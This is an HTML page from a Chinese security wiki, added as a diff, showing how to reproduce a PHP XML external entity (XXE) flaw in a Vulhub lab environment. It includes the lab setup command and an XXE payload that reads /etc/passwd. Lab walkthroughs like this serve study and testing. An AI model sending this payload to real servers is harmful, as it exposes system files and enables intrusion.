@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E/PHP%20%E7%8E%AF%E5%A2%83%20XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>PHP 环境 XML 外部实体注入漏洞（XXE） - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "PHP \u73af\u5883 XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08XXE\uff09", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PHP-FPM%20Fastcgi%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PHP-FPM%20Fastcgi%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PHP-FPM Fastcgi 未授权访问漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-link">
+        PHP 利用 phpinfo 包含临时文件 getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="php-xml-xxe">PHP 环境 XML 外部实体注入漏洞（XXE）<a class="headerlink" href="#php-xml-xxe" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>libxml 2.9.0 以后，默认不解析外部实体，导致 XXE 漏洞逐渐消亡。为了演示 PHP 环境下的 XXE 漏洞，本例会将 libxml 2.8.0 版本编译进 PHP 中。PHP 版本并不影响 XXE 利用。</p>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub 执行如下命令启动环境（PHP 7.0.30，libxml 2.8.0）：</p>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<p>环境启动后，访问 <code>http://your-ip:8080/index.php</code> 即可看到 phpinfo。</p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>Web 目录为 <code>./www</code>，其中包含 4 个文件：</p>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>tree<span class="w"> </span>.
+.
+├──<span class="w"> </span>dom.php<span class="w"> </span><span class="c1"># 示例：使用DOMDocument解析body</span>
+├──<span class="w"> </span>index.php
+├──<span class="w"> </span>SimpleXMLElement.php<span class="w"> </span><span class="c1"># 示例：使用SimpleXMLElement类解析body</span>
+└──<span class="w"> </span>simplexml_load_string.php<span class="w"> </span><span class="c1"># 示例：使用simplexml_load_string函数解析body</span>
+</code></pre></div>
+<p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code> 均可触发 XXE 漏洞，具体输出点请阅读这三个文件的代码。</p>
+<p>Simple XXE Payload：</p>
+<div class="highlight"><pre><span></span><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE xxe [
+&lt;!ELEMENT name ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
+&lt;root&gt;
+&lt;name&gt;&amp;xxe;&lt;/name&gt;
+&lt;/root&gt;
+</code></pre></div>
+<p><img alt="" src="../images/PHP%20%E7%8E%AF%E5%A2%83%20XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/image-20240529111116223.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PHP-FPM%20Fastcgi%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PHP-FPM%20Fastcgi%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PHP-FPM Fastcgi 未授权访问漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PHP%20%E5%88%A9%E7%94%A8%20phpinfo%20%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%20getshell/" class="btn btn-xs btn-link">
+        PHP 利用 phpinfo 包含临时文件 getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
